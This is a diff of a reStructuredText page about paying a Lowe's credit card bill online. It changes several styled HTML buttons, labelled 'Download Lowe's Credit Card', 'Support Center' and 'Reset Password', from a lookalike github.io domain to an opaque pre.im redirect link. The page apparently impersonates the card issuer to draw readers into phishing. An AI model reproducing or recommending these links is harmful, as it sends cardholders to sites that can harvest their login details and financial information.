@@ -3,7 +3,7 @@ How to Pay Your Lowe’s Credit Card Bill Online
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://lowessyfcom-activate.github.io/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href=" https://pre.im/?40n7oVR17PGFrTa5sm6Ga828v1TUrPLc2kpbWTzPC6gbjYipCVip1w2sMcdRN6XsG4OgJp4XE" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Lowe’s Credit Card
         </a>
     </div>
@@ -121,13 +121,13 @@ Want to save time every month? Set up AutoPay so you never have to worry about m
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://lowessyfcom-activate.github.io/" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?40n7oVR17PGFrTa5sm6Ga828v1TUrPLc2kpbWTzPC6gbjYipCVip1w2sMcdRN6XsG4OgJp4XE" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Download Lowes Credit Card
         </a>
-        <a href="https://lowessyfcom-activate.github.io/" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?40n7oVR17PGFrTa5sm6Ga828v1TUrPLc2kpbWTzPC6gbjYipCVip1w2sMcdRN6XsG4OgJp4XE" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Lowes Credit Card Support Center
         </a>
-        <a href="https://lowessyfcom-activate.github.io/" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?40n7oVR17PGFrTa5sm6Ga828v1TUrPLc2kpbWTzPC6gbjYipCVip1w2sMcdRN6XsG4OgJp4XE" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Reset Lowes Credit Card  Password
         </a>
     </div>
